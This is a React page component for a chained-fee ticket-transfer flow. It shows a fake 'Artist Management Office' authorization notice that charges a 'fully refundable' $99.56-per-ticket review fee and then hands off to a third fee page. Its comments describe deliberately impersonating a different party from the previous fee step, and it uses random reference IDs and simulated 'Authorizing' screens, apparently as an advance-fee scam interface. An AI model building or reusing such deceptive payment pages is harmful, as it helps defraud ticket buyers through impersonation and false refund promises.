import { useState } from 'react'
import { useLocation, useNavigate } from 'react-router-dom'
import { IoArrowBack, IoRibbonOutline } from 'react-icons/io5'
import { MdOutlineConfirmationNumber } from 'react-icons/md'
import SplashScreen from '../components/SplashScreen'
import ConfirmAlert from '../components/ConfirmAlert'
import SecondFeeConfirmSheet from './SecondFeeConfirmSheet'
import LoadingScreen from '../components/LoadingScreen'
import ConfirmationScreen from '../components/ConfirmationScreen'
import './SecondFee.css'

// Refundable review fee, charged per ticket like the transfer fee.
const SECOND_FEE_PER_TICKET = 99.56 
// ── Management Review Fee page ──────────────────────────────────────────────
// Reached from FirstFee.jsx right after the transfer fee is paid. Presented
// as a formal authorization notice from the artist's management office
// (deliberately distinct in party and register from the venue-branded
// transfer fee) — refunded automatically once the transfer is approved.
const SecondFee = () => {
  const { state } = useLocation()
  const navigate  = useNavigate()
  const [confirmAlertOpen, setConfirmAlertOpen] = useState(false)
  const [sheetOpen, setSheetOpen] = useState(false)
  const [phase, setPhase]           = useState('idle') // idle -> loading -> success
  const [showSplash, setShowSplash] = useState(true)
  const [refId]                     = useState(() => `TM-${Math.floor(1000000 + Math.random() * 9000000)}`)

  if (showSplash) {
    return <SplashScreen duration={2000} onDone={() => setShowSplash(false)} />
  }

  const event     = state?.event || null
  const tickets   = (state?.tickets && state.tickets.length) ? state.tickets : (event?.tickets || [])
  const recipient = state?.recipient || {}

  // Reached directly (refresh / no transfer in progress) — nothing to show
  if (!event) {
    return (
      <div className="sf-page sf-page--empty">
        <div className="sf-empty-inner">
          <MdOutlineConfirmationNumber size={40} color="#b8963e" />
          <p className="sf-empty-title">No Pending Authorization</p>
          <p className="sf-empty-sub">
            Start a ticket transfer from one of your events to see the management review notice here.
          </p>
          <button className="sf-empty-btn" onClick={() => navigate('/')}>Return To My Events</button>
        </div>
      </div>
    )
  }

  const recipientName    = [recipient.firstName, recipient.lastName].filter(Boolean).join(' ')
  const recipientContact = recipient.email || recipient.phone || ''
  const issueDate         = new Date().toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric' })
  const total             = SECOND_FEE_PER_TICKET * (tickets.length || 1)

  // Gate 1 — first ConfirmAlert: confirming just opens gate 2 (the sheet)
  const handleFirstConfirmed = () => {
    setConfirmAlertOpen(false)
    setSheetOpen(true)
  }

  // Gate 2 — confirmation sheet: confirming starts the loading phase
  const handleFinalConfirmed = () => {
    setSheetOpen(false)
    setPhase('loading')
  }

  // Loading screen #2
  if (phase === 'loading') {
    return (
      <LoadingScreen
        text="Authorizing…"
        sub="Confirming your review fee"
        duration={1600}
        onDone={() => setPhase('success')}
      />
    )
  }

  // Success screen #2 — hands off to /thirdfee
  if (phase === 'success') {
    return (
      <ConfirmationScreen
        text="Proceeding to Transfer"
        duration={1200}
        onDone={() => navigate('/thirdfee', { state: { event, tickets, recipient } })}
      />
    )
  }

  // ── Authorization notice ───────────────────────────────────────────────
  return (
    <div className="sf-page">
      <div className="sf-letterhead">
        <div className="sf-letterhead-left">
          <button className="sf-back-btn" onClick={() => navigate(-1)}>
            <IoArrowBack size={16} />
          </button>
          <div className="sf-brand">
            <strong>Artist Management Office</strong>
            Transfer Compliance Division
          </div>
        </div>
        <span className="sf-notice-badge">AUTHORIZED NOTICE</span>
      </div>

      <div className="sf-refline">
        <span>REF: {refId}</span>
        <span>{issueDate}</span>
      </div>

      <div className="sf-body">
        <p className="sf-re-line">
          <strong>Re:</strong> Ticket transfer review for <strong>{event.name}</strong>
          {event.stadium ? ` at ${event.stadium}` : ''}, {event.day} &bull; {event.date}.
        </p>

        <p className="sf-section-title">Recipient</p>
        <div className="sf-recipient-card">
          <p className="sf-recipient-name">{recipientName || 'Recipient'}</p>
          {recipientContact && <p className="sf-recipient-contact">{recipientContact}</p>}
        </div>

        <div className="sf-divider" />

        <p className="sf-section-title">Particulars</p>
        <div className="sf-fee-block">
          <div className="sf-fee-row">
            <span>Management review &amp; approval.</span>
            <span>{'$' + SECOND_FEE_PER_TICKET}</span>
          </div>
          <div className="sf-fee-row">
            <span>Tickets</span>
            <span>x{tickets.length || 1}</span>
          </div>
          <div className="sf-fee-row sf-fee-row--total">
            <span>Total due (refundable)</span>
            <span>{'$' + SECOND_FEE_PER_TICKET}</span>
          </div>
        </div>

        <div className="sf-auth-card">
          <div className="sf-auth-header">
            <IoRibbonOutline size={19} />
            <span>Authorization Required</span>
          </div>
          <span className="sf-refund-seal">Fully Refundable</span>
          <p className="sf-auth-text">
            <strong>{event.name}</strong>'s management team reviews and approves every ticket
            transfer to prevent unauthorized resale and protect the artist's fans.
          </p>
          <p className="sf-auth-text">
            This review fee is refunded automatically once the transfer is approved
            {' '}{recipientName || 'your recipient'} pays nothing to receive the tickets.
          </p>
        </div>
      </div>

      <div className="sf-footer">
        <button
          className="sf-authorize-btn"
          onClick={() => setConfirmAlertOpen(true)}
        >
          {`Authorize & Remit $${SECOND_FEE_PER_TICKET}`}
        </button>
        <p className="sf-fineprint">
          By continuing you authorize this refundable review charge on behalf of {event.name}'s management office.
        </p>
      </div>

      {confirmAlertOpen && (
        <ConfirmAlert
          title="Confirm Payment"
          message={`Authorize $${total.toFixed(2)} for ${tickets.length || 1} ticket${(tickets.length || 1) !== 1 ? 's' : ''} and refund to ${recipientName}?`}
          confirmLabel={`Pay $${total.toFixed(2)}`}
          cancelLabel="Cancel"
          onConfirm={handleFirstConfirmed}
          onCancel={() => setConfirmAlertOpen(false)}
        />
      )}

      {sheetOpen && (
        <SecondFeeConfirmSheet
          perTicket={SECOND_FEE_PER_TICKET}
          count={tickets.length}
          refId={refId}
          onConfirm={handleFinalConfirmed}
          onCancel={() => setSheetOpen(false)}
          recipient={recipientName}
        />
      )}
    </div>
  )
}

export default SecondFee
